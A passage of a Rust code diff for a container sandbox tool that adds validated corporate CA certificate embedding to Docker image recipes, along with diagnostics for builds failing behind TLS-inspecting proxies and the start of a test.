@@ -15,10 +15,10 @@ use std::path::Path;
 /// harness tag does: with a mutable `:latest`, `ensure` sees the tag present and
 /// skips the build, so a base change never reaches an install that already
 /// built it. Adding `socat` to the base silently did nothing until this.
-pub fn base_tag() -> String {
+pub fn base_tag(ca: Option<&str>) -> String {
     use std::hash::{Hash, Hasher};
     let mut h = std::collections::hash_map::DefaultHasher::new();
-    base_dockerfile().hash(&mut h);
+    base_dockerfile(ca).hash(&mut h);
     format!("omh/base:{:x}", h.finish())
 }
 
@@ -26,11 +26,11 @@ pub fn base_tag() -> String {
 /// reaches an install that already built the old one. With a fixed `:latest`,
 /// `ensure` saw the tag present and skipped the build — while `omh init`
 /// reported "already built".
-pub fn tag_for(adapter: &Adapter) -> String {
+pub fn tag_for(adapter: &Adapter, ca: Option<&str>) -> String {
     use std::hash::{Hash, Hasher};
     let mut h = std::collections::hash_map::DefaultHasher::new();
-    harness_dockerfile(adapter).hash(&mut h);
-    base_dockerfile().hash(&mut h);
+    harness_dockerfile(adapter, ca).hash(&mut h);
+    base_dockerfile(ca).hash(&mut h);
     format!("omh/{}:{:x}", adapter.name, h.finish())
 }
 
@@ -108,10 +108,373 @@ pub fn recipe_digest(recipe: &str) -> Result<String> {
     Ok(String::from_utf8(out.stdout)?.trim().to_string())
 }
 
-pub fn base_dockerfile() -> String {
+/// The corporate root this machine's traffic is inspected by, if one is set.
+///
+/// Read from the `ca_cert` setting — a path to a PEM on the host — because omh
+/// cannot guess which of the host's trusted roots is the one doing the
+/// inspecting, and injecting all of them would quietly widen what the sandbox
+/// trusts. That is the opposite of what a sandbox is for.
+///
+/// **An unreadable path is an error, not an empty answer.** Somebody sets this
+/// because their builds are failing; resolving a typo'd path to "no
+/// certificate" would rebuild exactly the image that was already failing and
+/// report success.
+/// Where `ca_cert` points, if anywhere.
+///
+/// Split out so there is exactly **one** reading of the settings behind both
+/// `ca_for` and `ca_path`. `ca_path` used to call `ca_for` for its refusals and
+/// then read the settings again for the value, so the path it handed to
+/// `docker run -v` was not the path whose PEM had been validated.
+fn ca_setting(paths: &crate::profile::Paths) -> Result<Option<std::path::PathBuf>> {
+    // `config::policy` rather than `policy_value`, which answers `Option` and
+    // so spells "this repo sets no certificate" and "omh could not read this
+    // repo's settings" the same way. `config::read_layer` deliberately
+    // distinguishes them — a `chmod 000` settings file, a TOML syntax error —
+    // and routing through the `Option` threw that away, so a repo whose
+    // settings omh cannot parse built a certificate-free image and called it a
+    // success.
+    let settings = anyhow::Context::context(
+        crate::config::policy(paths),
+        "reading this repo's settings to resolve `ca_cert`",
+    )?;
+    Ok(settings
+        .into_iter()
+        .find(|s| s.key == "ca_cert")
+        .map(|s| std::path::PathBuf::from(s.value)))
+}
+
+/// A corporate root omh has already refused if it could not be used.
+///
+/// **The only way to hold one is `Root::read`**, which is what makes every
+/// claim the rest of this module used to make in a comment — "already refused
+/// upstream", "safe by construction rather than by care" — a fact the compiler
+/// keeps. Before this, `ca_for` answered a bare `String` and `ca_path` a bare
+/// `PathBuf`, resolved separately: the pem that got hashed into the tag and the
+/// path that got mounted into the cross-build were two readings that nothing
+/// held together, and `ca_layer` accepted any `&str` in the program.
+///
+/// It carries the path as well as the text because both are needed and they
+/// must agree. The recipe embeds the *content*; `memory::deliver` mounts the
+/// *file*. Splitting them is what made `ca_path` exist, and `ca_path` is what
+/// re-read the settings behind `ca_for`'s back.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Root {
+    path: std::path::PathBuf,
+    pem: String,
+}
+
+impl Root {
+    /// Read the file `ca_cert` names, refusing anything that is not exactly
+    /// certificates. **Every refusal this setting makes lives here**, which is
+    /// the point: there is no other constructor.
+    fn read(at: std::path::PathBuf) -> Result<Self> {
+        // **Absolute, or docker invents a volume.** A relative `ca_cert`
+        // resolves against the process CWD, so it reads fine and the image is
+        // correct — while `docker run -v` treats a non-absolute source as a
+        // *named volume* and mounts an empty directory where the certificate
+        // should be. It is also meaningless as a committed value: this key is
+        // `Secret::No`, so it arrives with a clone, where "the directory omh
+        // happened to be run from" is not a shared fact.
+        anyhow::ensure!(
+            at.is_absolute(),
+            "`ca_cert` names `{}`, which is not an absolute path. Docker reads \
+             a relative `-v` source as a named volume, so the cross-build would \
+             mount an empty directory where the certificate should be, and a \
+             teammate who clones this repo resolves it somewhere else entirely. \
+             Give the full path.",
+            at.display()
+        );
+        // Cloned for the messages below, because `at` is moved into the
+        // `Root` at the end and the refusals all want to name the file.
+        let path_for_msg = at.clone();
+
+        // The loop below binds its own `at` for a line number, so the path gets a
+        // name of its own rather than being shadowed halfway through.
+        // Bytes, not `read_to_string`. A real DER `.crt` is binary, so reading it
+        // as text failed on the UTF-8 boundary and the reader got an encoding
+        // error — while the message written for exactly that file, the one naming
+        // the `openssl` conversion, sat below an `ensure!` it could never reach.
+        let raw = anyhow::Context::with_context(std::fs::read(&at), || {
+            format!(
+                "reading the certificate named by `ca_cert` ({})",
+                path_for_msg.display()
+            )
+        })?;
+        anyhow::ensure!(
+            !raw.is_empty(),
+            "`ca_cert` names {}, which is empty. Nothing was converted wrongly — \
+         there is no certificate in that file to convert.",
+            path_for_msg.display()
+        );
+        let der_advice = || {
+            format!(
+                "`ca_cert` names {}, which is not a PEM certificate — a \
+             `BEGIN CERTIFICATE` block is what this reads. A `.crt` in DER form \
+             converts with `openssl x509 -inform der -in <file> -out <file>.pem`",
+                path_for_msg.display()
+            )
+        };
+        let pem = String::from_utf8(raw).map_err(|_| anyhow::anyhow!(der_advice()))?;
+        anyhow::ensure!(pem.contains("BEGIN CERTIFICATE"), "{}", der_advice());
+
+        // **Exactly certificates, and nothing else.** The docs promise a file
+        // carrying `pkcs12` preamble is refused rather than rewritten, and for a
+        // while only a quote or a backslash was refused — so a clean
+        // `friendlyName: Acme Root CA` was accepted and `ca_layer` dropped it on
+        // the way past, which is the rewrite the promise rules out.
+        //
+        // Anchored on the whole delimiter, not the substring: a CSR opens
+        // `-----BEGIN CERTIFICATE REQUEST-----`, which contains `BEGIN
+        // CERTIFICATE` and used to pass. And a block must close, because a clipped
+        // paste of `security find-certificate -a` leaves one open — `ca_layer`
+        // silently dropped the unterminated block and emitted a recipe with no
+        // certificate in it at all, which builds green and trusts nothing.
+        const BEGIN: &str = "-----BEGIN CERTIFICATE-----";
+        const END: &str = "-----END CERTIFICATE-----";
+        let mut open_at: Option<usize> = None;
+        let mut blocks = 0usize;
+        for (n, line) in pem.lines().enumerate() {
+            let line = line.trim();
+            let at = n + 1;
+            if line == BEGIN {
+                anyhow::ensure!(
+                    open_at.is_none(),
+                    "line {at} of {} opens a certificate while the one at line {} \
+                 is still open — that file is not a sequence of PEM blocks.",
+                    path_for_msg.display(),
+                    open_at.unwrap_or(0)
+                );
+                open_at = Some(at);
+            } else if line == END {
+                anyhow::ensure!(
+                    open_at.is_some(),
+                    "line {at} of {} closes a certificate that was never opened.",
+                    path_for_msg.display()
+                );
+                open_at = None;
+                blocks += 1;
+            } else if open_at.is_none() {
+                anyhow::ensure!(
+                    line.is_empty(),
+                    "line {at} of {} sits outside any `BEGIN CERTIFICATE` / `END \
+                 CERTIFICATE` block: `{}`. A `pkcs12` export carries `Bag \
+                 Attributes` and `friendlyName:` preamble, and a `.pem` from a \
+                 browser can carry a `subject=` line — omh will not drop them \
+                 to make the file fit, because dropping is rewriting. Strip \
+                 the file to the blocks and nothing else.",
+                    path_for_msg.display(),
+                    if line.len() > 60 { &line[..60] } else { line }
+                );
+            }
+        }
+        anyhow::ensure!(
+            open_at.is_none(),
+            "{} is truncated: the certificate opened at line {} has no matching \
+         `END CERTIFICATE`. A clipped copy-paste does this, and omh will not \
+         embed part of a certificate.",
+            path_for_msg.display(),
+            open_at.unwrap_or(0)
+        );
+        anyhow::ensure!(
+            blocks > 0,
+            "`ca_cert` names {}, which has no `-----BEGIN CERTIFICATE-----` block. \
+         A certificate *request* is not a certificate, and neither is a \
+         private key.",
+            path_for_msg.display()
+        );
+        // Refused here, not neutralised in the recipe. `ca_layer` writes each line
+        // as a single-quoted `printf` argument, and the first version dropped any
+        // quote or backslash before writing — which mangles a file the user named
+        // while the comment above it claimed to refuse one. Neither character can
+        // appear in a PEM body; both appear in `openssl pkcs12` preamble lines,
+        // and a company name with an apostrophe is not rare.
+        for (n, line) in pem.lines().enumerate() {
+            anyhow::ensure!(
+                !line.contains(['\'', '\\']),
+                "line {} of {} contains a quote or backslash, which cannot appear \
+             in a PEM body. omh will not rewrite a certificate to make it fit \
+             the recipe — strip the file down to the `BEGIN CERTIFICATE` / \
+             `END CERTIFICATE` blocks and nothing else.",
+                n + 1,
+                path_for_msg.display()
+            );
+        }
+        Ok(Self { path: at, pem })
+    }
+
+    /// The certificate text. What the recipe embeds, and therefore what the
+    /// image tag is a digest of.
+    pub fn pem(&self) -> &str {
+        &self.pem
+    }
+
+    /// The file on this host. What the cross-build mounts read-only, because
+    /// upstream's `rust:1-bookworm` has no recipe to bake it into.
+    pub fn path(&self) -> &std::path::Path {
+        &self.path
+    }
+}
+
+pub fn ca_for(paths: &crate::profile::Paths) -> Result<Option<Root>> {
+    let Some(at) = ca_setting(paths)? else {
+        return Ok(None);
+    };
+    Ok(Some(Root::read(at)?))
+}
+
+/// The lines that teach the image to trust a corporate root, or nothing.
+///
+/// Behind a TLS-inspecting proxy every server the build reaches presents a
+/// certificate signed by the company's own CA. The host trusts it; a container
+/// does not, so the graph download and `npm install -g` the harness both fail
+/// on an unknown issuer and no image can be built.
+///
+/// **Not `apt-get`**, which this used to claim. This layer is placed *after*
+/// the package that provides `update-ca-certificates`, so if apt really failed
+/// on an unknown issuer nothing here could help — the recipe would die three
+/// lines above. It does not fail, because Debian's default sources are plain
+/// HTTP. Naming it sent the reader to a fix that could not apply.
+///
+/// **Written into the recipe rather than passed as a build arg**, because the
+/// tag is a digest of the recipe text: a build arg leaves that text identical,
+/// so an image built without a certificate would be reused for somebody who
+/// had set one and setting it would look like it did nothing. That is the
+/// stale-tag failure `tag_for` records. Here the certificate is part of what
+/// the image *is*.
+///
+/// `NODE_EXTRA_CA_CERTS` is not belt and braces. Node does not read the system
+/// trust store, the base image is node, and the claude harness arrives through
+/// `npm install -g` — so it is the fetch most likely to be the reason somebody
+/// set this, and the one `update-ca-certificates` cannot reach.
+///
+/// **What is claimed here is what has been measured**, and the variables have
+/// now been isolated. Three arms against a local `openssl s_server` presenting
+/// a leaf signed by a self-signed root, on this recipe's `node:22-bookworm-slim`
+/// base with the python, go and rust stacks installed:
+///
+/// | | no root | root in the store, no variables | this recipe |
+/// |---|---|---|---|
+/// | curl | `unable to get local issuer` | verifies | verifies |
+/// | node | `UNABLE_TO_VERIFY_LEAF_SIGNATURE` | **`UNABLE_TO_VERIFY_LEAF_SIGNATURE`** | verifies |
+/// | python | `CERTIFICATE_VERIFY_FAILED` | verifies | verifies |
+/// | git | `server certificate verification failed` | verifies | verifies |
+/// | go | `x509: certificate signed by unknown authority` | verifies | verifies |
+/// | pip | `CERTIFICATE_VERIFY_FAILED` | verifies | verifies |
+/// | cargo | `SSL certificate is invalid; class=Ssl` | verifies | verifies |
+///
+/// So the middle column is the finding: on this base image
+/// `update-ca-certificates` is enough for six of the seven, Debian's pip
+/// included — its vendored certifi resolves to `/etc/ssl/certs/ca-certificates.crt`.
+/// Only `NODE_EXTRA_CA_CERTS` is load-bearing. The other six are kept because
+/// they cost nothing and cover a base image that patches its tools
+/// differently, and they are described that way rather than as each being what
+/// makes its tool work. An earlier version of this comment said "three of the
+/// four do not read the system store", which was a stronger claim than any
+/// measurement then supported.
+///
+/// `omh doctor` is what checks the root actually arrived on a given machine;
+/// the table above is what the recipe was designed against.
+fn ca_layer(ca: Option<&str>) -> String {
+    let Some(pem) = ca else {
+        return String::new();
+    };
+    const DIR: &str = "/usr/local/share/ca-certificates";
+    const NODE_AT: &str = "/usr/local/share/omh-ca.pem";
+    const BUNDLE: &str = "/etc/ssl/certs/ca-certificates.crt";
+
+    // **One file per certificate**, because `update-ca-certificates` treats
+    // each file under `DIR` as exactly one. Measured against a real build with
+    // a two-certificate bundle in one file: it prints `rehash: warning:
+    // skipping omh-ca.pem, it does not contain exactly one certificate or CRL`
+    // and `1 added`. Both roots still reach `BUNDLE`, so the five variables
+    // pointing there work — but no `<hash>.0` symlink is written, and
+    // `SSL_CERT_DIR`, which this recipe also sets, cannot find the root by
+    // hash. Corporate IT hands out a chain more often than a single root, so
+    // this is the common case rather than the edge one.
+    //
+    // Only the marked blocks travel — but nothing unmarked ever gets this far
+    // any more. This used to *drop* `pkcs12` preamble, which is a rewrite of a
+    // file the user named, while both doc pages promised a refusal; `ca_for`
+    // now refuses it, so this loop is a parser rather than an editor.
+    let mut blocks: Vec<Vec<&str>> = Vec::new();
+    let mut current: Option<Vec<&str>> = None;
+    for line in pem.lines() {
+        if line.contains("BEGIN CERTIFICATE") {
+            current = Some(Vec::new());
+        }
+        if let Some(block) = current.as_mut() {
+            block.push(line);
+            if line.contains("END CERTIFICATE") {
+                blocks.push(current.take().expect("just pushed into it"));
+            }
+        }
+    }
+
+    // One quoted argument per line. A heredoc would be shorter and is not
+    // portable to every builder omh may meet; `printf` with the lines quoted
+    // is. Nothing is escaped or stripped here — `ca_for` has already refused a
+    // file carrying a quote or a backslash, which is what makes this safe by
+    // construction rather than by care.
+    let mut out = String::from(
+        "\n# The corporate root this machine's traffic is inspected by, from\n         # `omh set --local ca_cert`. Placed after the package that provides\n         # `update-ca-certificates`, and before the first fetch that needs it.\n         RUN mkdir -p /usr/local/share/ca-certificates \\\n",
+    );
+    for (n, block) in blocks.iter().enumerate() {
+        out.push_str(" && printf '%s\\n' \\\n");
+        for line in block {
+            out.push_str(&format!("      '{line}' \\\n"));
+        }
+        out.push_str(&format!("      > {DIR}/omh-ca-{}.crt \\\n", n + 1));
+    }
+    // Node reads one file, not a directory, so it gets the chain back in one
+    // piece — outside `DIR`, where `update-ca-certificates` would find it and
+    // print the skip warning this split exists to avoid.
+    out.push_str(&format!(
+        " && cat {DIR}/omh-ca-*.crt > {NODE_AT} \\\n && update-ca-certificates\n"
+    ));
+
+    // `update-ca-certificates` fixes the **system** store, and not every
+    // toolchain reads it. pip ships its own `certifi`; node reads one named
+    // file. So setting only the system store would leave the `tools` provide
+    // in `stacks/python.toml` — `pip3 install --break-system-packages
+    // --no-cache-dir pytest ruff` — failing exactly as before, and whoever set
+    // `ca_cert` would reasonably conclude the setting does not work.
+    //
+    // The quotation is the whole line, not a shortened one. It used to read
+    // `pip3 install pytest ruff`, which is not what that file says.
+    //
+    // On the image rather than at launch, so a stack layer building *on top*
+    // of this gets them too: the `curl` that fetches rustup, `pip3 install`
+    // and `corepack` all run at build time, which is where the failure this
+    // fixes actually happens. **rustup itself is not named**: what needs the
+    // root there is the `curl | sh` that downloads it, which the system store
+    // covers — `CARGO_HTTP_CAINFO` is cargo's, and whether rustup honours any
+    // of these is a fact about their software that nothing here has measured.
+    out.push_str(&format!(
+        "ENV SSL_CERT_FILE={BUNDLE} \\\n         \x20   SSL_CERT_DIR=/etc/ssl/certs \\\n         \x20   NODE_EXTRA_CA_CERTS={NODE_AT} \\\n         \x20   REQUESTS_CA_BUNDLE={BUNDLE} \\\n         \x20   PIP_CERT={BUNDLE} \\\n         \x20   CARGO_HTTP_CAINFO={BUNDLE} \\\n         \x20   GIT_SSL_CAINFO={BUNDLE}\n"
+    ));
+
+    // And again where an ssh login will find them. `ENV` covers the image and
+    // everything `docker exec` starts — which is `omh s run` and `attach` — but
+    // sshd does not pass its own environment to a session: it builds one from
+    // PAM, and `PermitUserEnvironment` is off by default. A session reached
+    // from VS Code, Zed or JetBrains Gateway (`src/ssh.rs`) therefore gets the
+    // system store, which `update-ca-certificates` fixed, and none of the
+    // variables — so `curl` and `git` work there and `npm install`, `pip
+    // install` and `cargo add` do not. The build succeeds and the session
+    // half-works, which is the worst of the three outcomes.
+    //
+    // `/etc/environment` is read by `pam_env`, which sshd runs.
+    out.push_str(&format!(
+        "RUN printf '%s\\n' \\\n      \'SSL_CERT_FILE={BUNDLE}\' \\\n      \'SSL_CERT_DIR=/etc/ssl/certs\' \\\n      \'NODE_EXTRA_CA_CERTS={NODE_AT}\' \\\n      \'REQUESTS_CA_BUNDLE={BUNDLE}\' \\\n      \'PIP_CERT={BUNDLE}\' \\\n      \'CARGO_HTTP_CAINFO={BUNDLE}\' \\\n      \'GIT_SSL_CAINFO={BUNDLE}\' \\\n      >> /etc/environment\n"
+    ));
+    out
+}
+
+pub fn base_dockerfile(ca: Option<&str>) -> String {
     // Interpolated rather than written out, so the directory the image
     // prepares and the directory the launcher mounts into cannot drift.
     let notes = crate::memory::GUEST_LOCAL_NOTES;
+    let ca_layer = ca_layer(ca);
     // node:*-slim ships a `node` user already holding UID 1000, so rename it
     // rather than fighting it — sbx requires that UID to be `agent`.
     format!(
@@ -120,7 +483,7 @@ pub fn base_dockerfile() -> String {
 RUN apt-get update && apt-get install -y --no-install-recommends \
       ca-certificates git ripgrep dtach sudo curl less jq procps openssh-server socat \
  && rm -rf /var/lib/apt/lists/*
-
+{ca_layer}
 RUN usermod -l agent -d {GUEST_HOME} -m node \
  && groupmod -n agent node \
  && echo 'agent ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/agent \
@@ -171,10 +534,14 @@ WORKDIR /work
     .replace("__GRAPH_INSTALL__", &crate::base::graph_install())
 }
 
-pub fn harness_dockerfile(adapter: &Adapter) -> String {
+pub fn harness_dockerfile(adapter: &Adapter, ca: Option<&str>) -> String {
     // Install as root, run as agent: an image that ends privileged would hand
     // the agent the sandbox's own escape hatch.
-    let mut df = format!("FROM {}\nUSER root\nRUN {}\n", base_tag(), adapter.install);
+    let mut df = format!(
+        "FROM {}\nUSER root\nRUN {}\n",
+        base_tag(ca),
+        adapter.install
+    );
 
     // Docker creates a missing mount parent as root, leaving the agent unable
     // to write beside its own config — atomic credential writes and transcripts
@@ -200,8 +567,8 @@ pub fn harness_dockerfile(adapter: &Adapter) -> String {
 ///
 /// Root to install, `agent` to run, exactly as the harness layer: an image that
 /// ends privileged hands the agent the sandbox's own escape hatch.
-pub fn stack_dockerfile(adapter: &Adapter, installs: &[&str]) -> String {
-    let mut df = format!("FROM {}\nUSER root\n", tag_for(adapter));
+pub fn stack_dockerfile(adapter: &Adapter, installs: &[&str], ca: Option<&str>) -> String {
+    let mut df = format!("FROM {}\nUSER root\n", tag_for(adapter, ca));
     for install in installs {
         df.push_str(&format!("RUN {install}\n"));
     }
@@ -227,15 +594,15 @@ pub fn stack_dockerfile(adapter: &Adapter, installs: &[&str]) -> String {
 /// on top of it. A provide that applies but installs nothing — the `runtime`
 /// assertion in `stacks/node.toml` — correctly does not move the tag, because
 /// it changes nothing about the image.
-pub fn stack_tag(adapter: &Adapter, installs: &[&str]) -> String {
+pub fn stack_tag(adapter: &Adapter, installs: &[&str], ca: Option<&str>) -> String {
     if installs.is_empty() {
-        return tag_for(adapter);
+        return tag_for(adapter, ca);
     }
     use std::hash::{Hash, Hasher};
     let mut h = std::collections::hash_map::DefaultHasher::new();
-    stack_dockerfile(adapter, installs).hash(&mut h);
-    tag_for(adapter).hash(&mut h);
-    base_dockerfile().hash(&mut h);
+    stack_dockerfile(adapter, installs, ca).hash(&mut h);
+    tag_for(adapter, ca).hash(&mut h);
+    base_dockerfile(ca).hash(&mut h);
     format!("omh/{}:{:x}", adapter.name, h.finish())
 }
 
@@ -258,17 +625,19 @@ pub fn ensure_stack(
     program: &str,
     adapter: &Adapter,
     installs: &[&str],
+    ca: Option<&str>,
     repo: &Path,
 ) -> Result<String> {
-    ensure(program, adapter)?;
-    let tag = stack_tag(adapter, installs);
-    if tag != tag_for(adapter) && !exists(program, &tag) {
+    ensure(program, adapter, ca)?;
+    let tag = stack_tag(adapter, installs, ca);
+    if tag != tag_for(adapter, ca) && !exists(program, &tag) {
         eprintln!("omh: building {tag} — this repo's toolchain, first run only");
         build(
             program,
             &tag,
-            &stack_dockerfile(adapter, installs),
+            &stack_dockerfile(adapter, installs, ca),
             &Kind::Stack(adapter, repo),
+            ca,
         )?;
     }
     Ok(tag)
@@ -438,26 +807,144 @@ pub fn probe_args(tag: &str, script: &str) -> Vec<String> {
 
 /// Build the base and the harness layer if they are missing. Progress goes
 /// straight to the terminal: a multi-minute silent step reads as a hang.
-pub fn ensure(program: &str, adapter: &Adapter) -> Result<()> {
-    let base = base_tag();
+pub fn ensure(program: &str, adapter: &Adapter, ca: Option<&str>) -> Result<()> {
+    let base = base_tag(ca);
     if !exists(program, &base) {
         eprintln!("omh: building {base} (first run only)");
-        build(program, &base, &base_dockerfile(), &Kind::Base)?;
+        build(program, &base, &base_dockerfile(ca), &Kind::Base, ca)?;
     }
-    let t = tag_for(adapter);
+    let t = tag_for(adapter, ca);
     if !exists(program, &t) {
         eprintln!("omh: building {t}");
         build(
             program,
             &t,
-            &harness_dockerfile(adapter),
+            &harness_dockerfile(adapter, ca),
             &Kind::Harness(adapter),
+            ca,
         )?;
     }
     Ok(())
 }
 
-fn build(program: &str, tag: &str, dockerfile: &str, kind: &Kind) -> Result<()> {
+/// What a TLS-inspecting proxy looks like in a failed build, per toolchain.
+///
+/// **Measured, except where marked.** Most of these are the exact strings each
+/// tool produced against an `openssl s_server` presenting a leaf signed by a
+/// private root, on an image with no root installed — the control arm of the
+/// table in `ca_layer`'s doc. Two are not, and are labelled: they are
+/// openssl's own wording for verify code 19, added because the same failure
+/// reaches a build through tools that were not in the control, and it would be
+/// dishonest to file them under "measured".
+const INSPECTED: &[&str] = &[
+    // curl, and the `apt` and rustup fetches that go through it.
+    "unable to get local issuer certificate",
+    "SSL certificate problem",
+    // **Not measured.** openssl's wording for verify code 19, both spellings
+    // it has used across versions. No tool in the control arm printed these;
+    // they are here because the same proxy produces them through an openssl
+    // that was not one of the seven.
+    "self-signed certificate in certificate chain",
+    "self signed certificate in certificate chain",
+    // node — the one measured to ignore the system store.
+    "UNABLE_TO_VERIFY_LEAF_SIGNATURE",
+    // python, pip.
+    "CERTIFICATE_VERIFY_FAILED",
+    // go.
+    "x509: certificate signed by unknown authority",
+    // cargo, through libgit2.
+    "the SSL certificate is invalid",
+    // git.
+    "server certificate verification failed",
+];
+
+/// Why a build died, when omh can tell — and what to do about it.
+///
+/// `doctor`'s **guest-side** checks cannot answer this one. They launch the
+/// real image and inspect paths inside it, and behind a TLS-inspecting proxy
+/// there is no image: the build dies on an unknown issuer, so every one of
+/// them is unreachable. That is why doctor asks the question host-side instead
+/// — `doctor::inspected_hosts` — and why the diagnosis *also* lives here,
+/// where a build that got past the cache still dies.
+///
+/// Before this, a build behind a corporate proxy ended in `failed to build
+/// omh/base:…` with the reason scrolled past in the docker log — a user with
+/// no idea that a setting existed to fix it. That is the case `ca_cert` was
+/// written for, and the one omh was silent about.
+///
+/// Two answers, because they are different problems. With no `ca_cert` set,
+/// the fix is to set one. With one already set, the certificate is present and
+/// did not work — the likely causes are a chain missing its intermediate, or a
+/// root that is not the one this proxy actually presents.
+pub fn why_the_build_failed(log: &str, ca_set: bool) -> Option<String> {
+    let hit = INSPECTED.iter().find(|needle| log.contains(**needle))?;
+    Some(if ca_set {
+        format!(
+            "The build failed on an unverifiable certificate ({hit}), and \
+             `ca_cert` is already set — so the root omh embedded is not the one \
+             this connection needs. Corporate IT usually hands out a chain: \
+             check the file holds every certificate in it, and that it is the \
+             root your proxy actually presents. `omh doctor` reports whether \
+             the one omh embedded reached the trust store."
+        )
+    } else {
+        format!(
+            "The build failed on an unverifiable certificate ({hit}). That is \
+             what a TLS-inspecting proxy looks like — Zscaler, Netskope and the \
+             like re-sign every connection with the company's own root, which \
+             this machine trusts and a container does not.\n\
+             \n    omh set --local ca_cert /path/to/corp-root.pem\n\n\
+             On macOS the root is in the keychain rather than on disk:\n\
+             \n    security find-certificate -a -c \"Zscaler\" -p > ~/corp-root.pem\n\n\
+             See `docs/troubleshooting.md`. If you are not behind a proxy, this \
+             was a different certificate problem and the log above has it."
+        )
+    })
+}
+
+/// Hand a child's stderr back to the terminal, and keep a copy.
+///
+/// **Bytes, not lines.** This was `read_line(..).unwrap_or(0)`, which folds
+/// `InvalidData` — what `read_line` answers for any byte sequence that is not
+/// UTF-8 — into "the stream ended". One such byte and the relay stopped
+/// mid-build, so a build went silent where `Stdio::inherit` would have shown
+/// every byte; the captured log was truncated, so a certificate error arriving
+/// after it went undiagnosed; and nothing was left draining a pipe the child
+/// was still writing to, which is a hang rather than a wrong answer.
+///
+/// `read_until` with `from_utf8_lossy` cannot fail on encoding at all, which
+/// removes the class rather than handling it. A real I/O error on the read end
+/// means the pipe is gone and the child is about to get `EPIPE`, so that one is
+/// reported and ends the relay rather than passing silently as EOF.
+pub fn relay(err: std::process::ChildStderr) -> String {
+    use std::io::BufRead;
+    let mut reader = std::io::BufReader::new(err);
+    let mut log = String::new();
+    let mut buf = Vec::new();
+    loop {
+        buf.clear();
+        match reader.read_until(b'\n', &mut buf) {
+            Ok(0) => break,
+            Ok(_) => {
+                // `eprint!`, not a direct `write_all` to the handle. Both put
+                // the same bytes on stderr, but only this spelling is one the
+                // output-layer scan in `main.rs` can see — and a relay that
+                // the guard cannot see is a hole in it, whatever the intent.
+                // It is listed there, in `relayed`, as exactly this line.
+                let text = String::from_utf8_lossy(&buf);
+                eprint!("{text}");
+                log.push_str(&text);
+            }
+            Err(e) => {
+                eprintln!("omh: lost the rest of the build log ({e})");
+                break;
+            }
+        }
+    }
+    log
+}
+
+fn build(program: &str, tag: &str, dockerfile: &str, kind: &Kind, ca: Option<&str>) -> Result<()> {
     use anyhow::Context;
     use std::io::Write;
     use std::process::Stdio;
@@ -469,16 +956,53 @@ fn build(program: &str, tag: &str, dockerfile: &str, kind: &Kind) -> Result<()> 
     let mut child = std::process::Command::new(program)
         .args(build_args(tag, &context, kind))
         .stdin(Stdio::piped())
+        // Piped so omh can read the reason it failed, then written straight
+        // back out line by line — a build is minutes long and watching it is
+        // how you know it is alive, so capturing must not mean swallowing.
+        //
+        // **stderr only, and that is measured rather than assumed.** A review
+        // argued the classic builder writes step output to stdout, so the
+        // diagnosis would silently not exist under `DOCKER_BUILDKIT=0`. Half
+        // right: on docker 29.7.2 the classic builder does split its output —
+        // 2 lines of the error on stdout, 3 on stderr — while BuildKit puts
+        // all 7 on stderr. The needle reaches stderr either way, so the
+        // diagnosis fires for both, and the user sees the whole log regardless
+        // because stdout stays inherited.
+        //
+        // So do not "fix" this by piping stdout as well. That means draining
+        // two pipes from one thread, which is the deadlock this function
+        // already had to have designed out of it once, for no measured gain.
+        .stderr(Stdio::piped())
         .spawn()
         .with_context(|| format!("running {program} build"))?;
-    child
-        .stdin
-        .as_mut()
-        .context("build stdin")?
-        .write_all(dockerfile.as_bytes())?;
+
+    // **Closed before reading, not by `wait`.** omh sends the recipe on `-f -`,
+    // so docker reads stdin until EOF. `Child::wait` closes stdin for you, but
+    // the tee below runs *before* the wait — leaving it open here deadlocks
+    // the build against a reader that will never see the end of its recipe.
+    {
+        let mut stdin = child.stdin.take().context("build stdin")?;
+        stdin.write_all(dockerfile.as_bytes())?;
+    }
+
+    let log = match child.stderr.take() {
+        Some(err) => relay(err),
+        None => String::new(),
+    };
 
     let status = child.wait()?;
     if !status.success() {
+        // **Carried, not sniffed.** This read
+        // `dockerfile.contains("update-ca-certificates")`, which is true only
+        // of the *base* recipe: `harness_dockerfile` and `stack_dockerfile`
+        // are `FROM <tag>` and fold the certificate into an opaque digest. So
+        // the two layers that run `npm install -g` and `pip3 install` — the
+        // fetches a proxy actually kills — always looked like "no certificate
+        // set", and a user whose chain was missing an intermediate was told to
+        // set the setting they had already set.
+        if let Some(why) = why_the_build_failed(&log, ca.is_some()) {
+            anyhow::bail!("failed to build {tag}\n\n{why}");
+        }
         anyhow::bail!("failed to build {tag}");
     }
     reap(program, tag, kind);
@@ -1606,9 +2130,298 @@ mod tests {
         Adapter::find(adapters(), "claude").unwrap()
     }
 
+    /// A corporate CA reaches the image, and changes what it is called.
+    ///
+    /// Behind a TLS-inspecting proxy — Zscaler and friends — every server the
+    /// build talks to presents a certificate signed by the company's own root.
+    /// The host trusts it, because IT put it in the system store. The
+    /// container does not, so `apt-get`, the graph download and
+    /// `npm install -g` the harness all fail on an unknown issuer, and omh
+    /// cannot build an image at all.
+    ///
+    /// **Embedded in the recipe, not passed as a build arg.** A `--build-arg`
+    /// leaves the Dockerfile text identical, so the tag — which is a digest of
+    /// that text — would not move: an image built without the certificate
+    /// would be reused for somebody who had set one, and setting it would
+    /// appear to do nothing. That is the stale-tag failure `tag_for`'s own doc
+    /// records. Embedding makes the certificate part of what the image *is*.
+    ///
+    /// Only the base needs it. The harness and stack layers are `FROM` it, so
+    /// they inherit the trust store, and both tags already hash the base
+    /// recipe — so one change moves all three.
+    #[test]
+    fn a_corporate_ca_reaches_the_image_and_moves_its_tag() {
+        let pem = "-----BEGIN CERTIFICATE-----\nMIIBself\n-----END CERTIFICATE-----";
+        let with = base_dockerfile(Some(pem));
+        let without = base_dockerfile(None);
+
+        // **Instructions only.** The block this layer emits opens with a
+        // Dockerfile comment that names `update-ca-certificates`, so every
+        // assertion below written against the recipe text was satisfied by the
+        // comment: deleting `&& update-ca-certificates` from the RUN left the
+        // whole suite green. What that hides is not cosmetic — the PEM still
+        // lands under `/usr/local/share/ca-certificates`, but nothing merges
+        // it into `/etc/ssl/certs/ca-certificates.crt`, which is where five of
+        // the seven variables point.
+        let commands: String = with
+            .lines()
+            .filter(|l| !l.trim_start().starts_with('#'))
+            .collect::<Vec<_>>()
+            .join("\n");
+
+        assert!(
+            commands.contains("MIIBself"),
+            "the certificate is in the recipe"
+        );
+        assert!(
+            commands.contains("&& update-ca-certificates"),
